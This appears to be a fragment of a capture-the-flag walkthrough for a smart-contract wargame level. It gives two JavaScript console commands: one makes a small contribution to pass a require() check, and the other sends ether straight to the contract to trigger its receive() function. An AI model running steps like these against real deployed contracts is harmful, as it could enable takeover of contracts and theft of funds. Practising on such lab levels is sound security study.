Contribute so we pass receive() require()

```javascript
await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
```

Send funds through receive()

```javascript
await sendTransaction({from:player, to:contract.address, value:toWei("0.00001") })
```
